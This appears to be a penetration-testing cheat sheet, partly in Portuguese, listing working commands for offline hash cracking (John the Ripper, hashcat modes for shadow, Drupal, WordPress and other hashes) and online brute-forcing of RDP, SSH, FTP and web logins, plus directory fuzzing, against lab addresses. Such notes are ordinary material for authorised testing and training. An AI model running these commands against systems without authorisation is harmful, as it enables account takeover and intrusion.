## Identificar hash

- https://hashes.com/en/tools/hash_identifier

## John the Ripper 

shadow file
```shell
unshadow passwd shadow > unshadow.db
john unshadow.db
```
## Hashcat

Drupal7
```
hashcat -m 7900 senha.txt /usr/share/wordlists/rockyou.txt
```


SHA512 $6$ shadow file
```
hashcat -m 1800 -a 0 hash.txt rockyou.txt --username
```

MD5 $1$ shadow file
```
hashcat -m 500 -a 0 hash.txt rockyou.txt --username
```

Hashcat MD5 Apache webdav file
```
hashcat -m 1600 -a 0 hash.txt rockyou.txt
```

Hashcat SHA1
```
hashcat -m 100 -a 0 hash.txt rockyou.txt --force
```

 Hashcat Wordpress
```
hashcat -m 400 -a 0 --remove hash.txt rockyou.txt
```
## NCRACK

RDP user with password list
```
ncrack -vv --user offsec -P passwords rdp://10.10.10.10
```

## Hydra

SSH user with password list
```
hydra -l user -P pass.txt -t 10 10.10.10.10 ssh -s 22
```

## Brute Force BASIC:

```shell
wfuzz -c -z file,/usr/share/wordlists/rockyou.txt --hc 401 -d --basic admin:FUZZ http://metasploitable.cg/restrito/
```

## Scan de arquivos URL via FUZZ:

```shell
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.90.76/phpmyadmin/FUZZ -mc 200,301,302 .php,.txt,.html -fs 3025
```
## Bruteforce com FUZZ

```shell
wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt --hs incorretos -d "usuario=admin&senha=FUZZ" 'http://192.168.90.197:8081/admin/admin_panel/conecta.php'
```

## Medusa

FTP user with password list
```
medusa -h 10.10.10.10 -u user -P passwords.txt -M ftp
```